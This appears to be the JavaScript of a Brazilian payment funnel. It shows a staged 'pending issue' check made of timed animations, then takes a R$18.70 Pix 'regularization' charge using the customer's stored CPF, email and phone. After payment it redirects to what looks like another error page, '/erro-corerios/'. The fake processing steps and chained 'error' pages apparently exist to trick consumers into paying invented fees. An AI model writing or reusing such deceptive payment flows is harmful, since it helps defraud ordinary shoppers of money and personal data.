/* ═══ Página 1 -> Página 2 (identificação da pendência) ═══ */
document.getElementById('btnResolver').addEventListener('click', function () {
  document.getElementById('page1').classList.remove('active')
  const p2 = document.getElementById('page2')
  p2.classList.add('active')

  const step1 = document.getElementById('step1')
  const step2 = document.getElementById('step2')
  const step3 = document.getElementById('step3')
  const spinner = document.getElementById('spinner')
  const btnPagarWrap = document.getElementById('btnPagarWrap')

  requestAnimationFrame(() => {
    setTimeout(() => { step1.classList.add('visible') }, 50)
    spinner.classList.add('visible')
  })

  setTimeout(() => {
    step2.classList.add('visible')
  }, 3000)

  setTimeout(() => {
    spinner.classList.remove('visible')
    spinner.classList.add('hidden')
    step3.classList.add('visible')
    setTimeout(() => { btnPagarWrap.classList.add('visible') }, 300)
  }, 6000)
})

/* ═══ Upsell: gera o Pix da regularização na mesma API da Velani ═══
   file:// (abrindo o arquivo no PC) = mock, simula o Pix sem cobrança real.
   Publicado no site = live, chama /api/upsell e /api/status. */
;(function () {
  const CFG = {
    mode: location.protocol === 'file:' ? 'mock' : 'live',
    apiBase: '/api',
    pollMs: 5000,
    timerSecs: 15 * 60,
  }

  const $ = (id) => document.getElementById(id)
  const brl = (c) => 'R$ ' + (c / 100).toFixed(2).replace('.', ',')

  const state = { idem: null, busy: false, poll: null, countdown: null }

  // Cliente salvo no checkout do index.html (pra gerar o Pix do upsell com os dados reais).
  function savedCustomer () {
    try { return JSON.parse(localStorage.getItem('allu_customer') || '{}') || {} } catch (e) { return {} }
  }

  // UTMs do clique, para atribuição de campanha na UTMify (via Velani).
  // Mescla o tracking salvo no checkout com o da URL atual (a URL tem prioridade).
  function tracking () {
    const o = Object.assign({}, savedCustomer().tracking || {})
    const q = new URLSearchParams(location.search)
    ;['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term', 'src', 'sck']
      .forEach((k) => { if (q.get(k)) o[k] = q.get(k) })
    return o
  }
  function uuid () {
    return (window.crypto && crypto.randomUUID)
      ? crypto.randomUUID()
      : 'u' + Date.now().toString(36) + Math.random().toString(36).slice(2, 10)
  }

  /* ---- camada de API (live) e simulação (mock) ---- */
  async function api (path, opts) {
    let r
    try { r = await fetch(CFG.apiBase + path, opts) } catch (e) { throw new Error('Sem conexão com o servidor. Tente novamente.') }
    let d = {}; try { d = await r.json() } catch (e) {}
    if (!r.ok) throw new Error(d.error || 'Não foi possível gerar o Pix. Tente novamente.')
    return d
  }
  function mockCreate () {
    const id = 'TESTE-' + Date.now().toString(36).toUpperCase()
    const code = '00020126580014br.gov.bcb.pix0136TESTE-UPSELL-0000-00000000000052040000530398654041' + '8.70' + '5802BR5905ALLU6009SAO PAULO62070503***6304TEST'
    return Promise.resolve({ orderId: id, status: 'pending', amountCents: 1870, pix: { copyPaste: code, qrImage: null } })
  }
  const MOCK_AT = {}
  function mockStatus (id) {
    if (!MOCK_AT[id]) MOCK_AT[id] = Date.now()
    return Promise.resolve({ status: Date.now() - MOCK_AT[id] > 8000 ? 'paid' : 'pending' })
  }
  const createUpsell = () => {
    if (CFG.mode === 'mock') return mockCreate()
    const c = savedCustomer()
    return api('/upsell', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        idempotencyKey: (state.idem || (state.idem = uuid())),
        customer: { name: c.name, cpf: c.cpf, email: c.email, phone: c.phone },
        tracking: tracking(),
      }),
    })
  }
  const getStatus = (id) => CFG.mode === 'mock'
    ? mockStatus(id)
    : api('/status?id=' + encodeURIComponent(id))

  /* ---- telas ---- */
  function showGenerating () {
    $('page2').classList.remove('active')
    $('pageGenerating').style.display = 'flex'
    const steps = ['gs1', 'gs2', 'gs3']
    steps.forEach((s, i) => setTimeout(() => {
      const el = $(s); if (el) { el.classList.add('visible'); setTimeout(() => el.classList.add('done'), 500) }
    }, 300 + i * 700))
  }

  function showPix (res) {
    $('pageGenerating').style.display = 'none'
    $('pagePix').style.display = 'block'
    if ($('pixAmount') && res.amountCents) $('pixAmount').textContent = brl(res.amountCents)

    const code = res.pix.copyPaste
    $('pixCode').value = code

    // QR Code: usa a imagem da Velani se vier, senão gera no navegador.
    const box = $('qrCanvas'); box.innerHTML = ''
    if (res.pix.qrImage) {
      const img = document.createElement('img')
      img.alt = 'QR Code Pix'; img.style.maxWidth = '100%'
      img.src = /^(data:|https?:)/.test(res.pix.qrImage) ? res.pix.qrImage : 'data:image/png;base64,' + res.pix.qrImage
      box.appendChild(img)
    } else if (window.QRCode) {
      try { new QRCode(box, { text: code, width: 200, height: 200, correctLevel: QRCode.CorrectLevel.M }) } catch (e) {}
    }

    startTimer()
    startPolling(res.orderId)
    window.scrollTo({ top: 0, behavior: 'smooth' })
  }

  function startTimer () {
    let s = CFG.timerSecs
    const disp = $('timerDisplay')
    const tick = () => {
      const m = String(Math.floor(s / 60)).padStart(2, '0'), ss = String(s % 60).padStart(2, '0')
      if (disp) disp.textContent = m + ':' + ss
      if (s <= 0) { clearInterval(state.countdown); if (state.poll) clearInterval(state.poll); if (disp) disp.textContent = 'Expirado' }
      s--
    }
    tick(); state.countdown = setInterval(tick, 1000)
  }

  function startPolling (orderId) {
    state.poll = setInterval(async () => {
      try {
        const s = await getStatus(orderId)
        if (s.status === 'paid') { clearInterval(state.poll); clearInterval(state.countdown); showPaid() }
      } catch (e) {}
    }, CFG.pollMs)
  }

  function showPaid () {
    const note = document.querySelector('#pagePix .pix-note')
    const qr = document.querySelector('#pagePix .qr-section')
    const copy = document.querySelector('#pagePix .copy-section')
    if (qr) qr.style.display = 'none'
    if (copy) copy.style.display = 'none'
    if (note) {
      note.innerHTML = '✓ <strong>Pagamento confirmado!</strong> Redirecionando…'
      note.style.cssText = 'background:#dcfce7;color:#166534;border-radius:10px;padding:14px;font-weight:600;text-align:center;'
    }
    window.scrollTo({ top: 0, behavior: 'smooth' })
    location.href = '/erro-corerios/'
  }

  /* ---- copiar código Pix (chamado pelo onclick do botão) ---- */
  window.copyPix = async function () {
    const input = $('pixCode'), btn = $('btnCopy')
    try { await navigator.clipboard.writeText(input.value) }
    catch (e) { input.select(); document.execCommand('copy') }
    if (btn) { const old = btn.innerHTML; btn.innerHTML = 'Copiado ✓'; setTimeout(() => { btn.innerHTML = old }, 2000) }
  }

  /* ---- clique no "Regularizar Pedido" ---- */
  $('btnPagarWrap').addEventListener('click', async function () {
    if (state.busy) return
    state.busy = true
    showGenerating()
    try {
      const res = await createUpsell()
      if (!res || !res.pix || !res.pix.copyPaste) throw new Error('Resposta inválida do servidor.')
      // garante que a animação de "gerando" apareça por um instante
      setTimeout(() => showPix(res), 1800)
    } catch (err) {
      state.busy = false
      $('pageGenerating').style.display = 'none'
      $('page2').classList.add('active')
      alert(err.message || 'Não foi possível gerar o Pix agora. Tente novamente.')
    }
  })
})()
